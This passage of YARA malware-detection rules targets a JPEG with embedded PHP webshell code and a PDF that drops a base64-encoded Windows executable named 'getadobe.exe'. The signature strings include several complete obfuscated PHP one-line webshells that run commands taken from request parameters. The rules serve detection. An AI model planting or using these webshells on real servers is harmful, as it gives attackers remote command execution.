      description = "MAL - file WhatsApp Image 2023-06-03 at 03.49.07.jpeg"
      hash1 = "395b9f6008a25bd2939985c836576b5bfa533be0180ac4f2f61dff70ab5c0541"
   strings:
      $s1 = "];echo`$_`?>" fullword ascii
      $s2 = "<?=$_=\"\";$_=\"'\";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'" ascii
      $s3 = "<?=`{$_REQUEST['_']}`?>" fullword ascii
      $s4 = "<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]); ?>" fullword ascii
      $s5 = "<?php $_=${'_'.('{{{' ^ '<>/')};$_[0]($_[1]($_[2])); ?>" fullword ascii
      $s6 = "<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]);?>" fullword ascii
      $s7 = "<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]); ?>" fullword ascii
      $s8 = "<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']);?>" fullword ascii
      $s9 = "<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>" fullword ascii
      $s10 = "<?php $_=${'_'.('{'^'<').('{'^'>;').('{'^'/')};$_[0]($_[1]($_[2])); ?>" fullword ascii
      $s11 = "<?=$_=${'_'.('{{{'^'<>/')};$_[0]($_[1]($_[2]));?>" fullword ascii
      $s12 = "<?php $_=\"{\"; $_=($_^\"<\").($_^\">;\").($_^\"/\"); ?> <?=${'_'.$_}[\"_\"](${'_'.$_}[\"__\"]);?>" fullword ascii
      $s13 = "<?=$_=${'_'.('{{{'^'<>/')};$_['__']($_['___']($_['____']));?>" fullword ascii
      $s14 = "<?=$_=\"\";$_=\"'\";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>"
   condition:
      uint16(0) == 0xd8ff and
      any of them
}

rule PDFTrojan_Dropper {
   meta:
      filename = "MAL - file dummies.pdf"
      hash1 = "77fbc7a9cd4006596b3461873a306448301615e81b51387d7da3ac3088ef0738"
   strings:
      $x1 = "     href=\"data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii 
      $s4 = "AAAAAAAAAAAAAAB" ascii 
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii 
      $s7 = "ZAAvYnVpbGQALi9taW5ndy13NjQtY3J0L2NydAB3aWxkY2FyZC5jAHdpbGRjYXJkLmMALi9taW5ndy13NjQtY3J0L2NydC9kbGxhcmd2LmMAL2J1aWxkAC9idWlsZAAu" ascii
      $s8 = "bAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s9 = "L21pbmd3LXc2NC1jcnQvY3J0AGRsbGFyZ3YuYwBkbGxhcmd2LmMALi9taW5ndy13NjQtY3J0L2NydC9fbmV3bW9kZS5jAC9idWlsZAAvYnVpbGQALi9taW5ndy13NjQt" ascii
      $s10 = "cmdzAF9fX21pbmd3X3dpbm1haW5fblNob3dDbWQAX19fbmF0aXZlX2RsbG1haW5fcmVhc29uAF9fX3Rsc19lbmRfXwBfSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbkA0" ascii
      $s11 = "U2VjdGlvbkA0AF9faW1wX19md3JpdGUA\" download=\"getadobe.exe\">Download</a>" fullword ascii
      $s12 = "AC9idWlsZAAuL21pbmd3LXc2NC1jcnQvY3J0AHRsc21jcnQuYwB0bHNtY3J0LmMALi9taW5ndy13NjQtY3J0L2NydC9wc2V1ZG8tcmVsb2MtbGlzdC5jAC9idWlsZAAv" ascii
      $s13 = "c3RlbV92ZXJzaW9uX18AX19fY3J0X3hsX3N0YXJ0X18AX19uZXdtb2RlAF9fX2NydF94aV9zdGFydF9fAF9faW1wX19fYW1zZ19leGl0AF9fX2NydF94aV9lbmRfXwBf" ascii
      $s14 = "ci5jAHVzZXJtYXRoZXJyLmMAbWF0aC5oAC4vbWluZ3ctdzY0LWNydC9jcnQveHR4dG1vZGUuYwAvYnVpbGQAL2J1aWxkAC4vbWluZ3ctdzY0LWNydC9jcnQAeHR4dG1v" ascii
      $s15 = "SEVSUgBfX19taW5nd19hcHBfdHlwZQBfX19taW5nd19pbml0bHRzZHJvdF9mb3JjZQBfX19jcnRfeHBfZW5kX18AX19pbXBfX3NpZ25hbABfX21pbm9yX29zX3ZlcnNp" ascii
      $s16 = "dC9uYXRzdGFydC5jAC9idWlsZAAvYnVpbGQALi9taW5ndy13NjQtY3J0L2NydAAvdXNyL2k2ODYtdzY0LW1pbmd3MzIvaW5jbHVkZQAuL21pbmd3LXc2NC1jcnQvaW5j" ascii
      $s17 = "L2k2ODYtdzY0LW1pbmd3MzIvaW5jbHVkZQBhY3J0X2lvYl9mdW5jLmMAYWNydF9pb2JfZnVuYy5jAHN0ZGlvLmgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s18 = "Q1JUJFhDQUEALkNSVCRYSUFBAC5kZWJ1Z19pbmZvAC5kZWJ1Z19hYmJyZXYALmRlYnVnX2xvY2xpc3RzAC5kZWJ1Z19hcmFuZ2VzAC5kZWJ1Z19ybmdsaXN0cwAuZGVi" ascii
      $s19 = "dWdfbGluZV9zdHIALmRlYnVnX2xvY2xpc3RzAC5kZWJ1Z19ybmdsaXN0cwBfX19taW5nd19pbnZhbGlkUGFyYW1ldGVySGFuZGxlcgBfcHJlX2NfaW5pdABfbWFuYWdl" ascii
      $s20 = "aHJfY3NfaW5pdABfX19fdzY0X21pbmd3dGhyX3JlbW92ZV9rZXlfZHRvcgBfX19taW5nd19UTFNjYWxsYmFjawBwc2V1ZG8tcmVsb2MtbGlzdC5jAF9fVmFsaWRhdGVJ" ascii
   condition:
      uint16(0) == 0x5025 and filesize < 400KB and
      1 of ($x*) and 4 of them
}

